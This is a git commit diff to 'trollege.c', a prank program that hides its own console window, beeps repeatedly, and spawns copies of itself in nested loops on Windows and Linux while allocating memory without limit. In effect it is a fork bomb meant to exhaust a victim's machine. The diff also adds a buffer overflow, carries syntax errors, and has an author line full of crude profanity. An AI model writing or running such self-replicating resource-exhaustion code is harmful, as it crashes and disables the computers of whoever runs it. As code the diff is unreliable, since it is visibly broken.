6576b0946baf8340d0860f389ef2e2846f985c6b
Teresa Fuckyouiamnotputingmylastnameheresuckmycock <99054975+ComradeYellowCitrusFruit@users.noreply.github.com>
2022-03-31 19:45:53 -0400

    Update trollege.c

--- src/trollege.c
+++ src/trollege.c
@@ -1,5 +1,8 @@
 #include <stdlib.h>
 #include <stdio.h>
+#ifdef __linux__
+#include <sys/types.h>
+#endif
 #ifdef _WIN32
     #define _WIN32_WINNT 0x0500
     #include <windows.h>
@@ -13,18 +16,29 @@ int main()
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
     #endif
-    FILE *x[4294967295];
-    for(unsigned int i = 0; i < 4294967295; i++) {
+    FILE *x[268435455];
+    for(unsigned int i = 0; i < 268435455; i++) {
         for(int y = 0; y < 10; y++) {
-            print('\x7');
-            fork();
+            printf('\x7');
+            #ifdef _WIN32
+            PROCESS_INFORMATION ProcessInfo;
+
+            STARTUPINFO StartupInfo;
+
+            ZeroMemory(&StartupInfo, sizeof(StartupInfo));
+            StartupInfo.cb = sizeof(StartupInfo);
+            CreateProcess("trollege.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
+            #endif 
+            #ifdef __linux__
+            fork()
+            #endif
         }
         if(i <= 1000) {
             malloc(1000);
         } else {
             malloc(i);
         }
-        char str[20];
+        char str[10];
         for(int y = 0; y < 20; y++)
         {
             str[y] = (rand() % (126 - 32 + 1)) + 32;
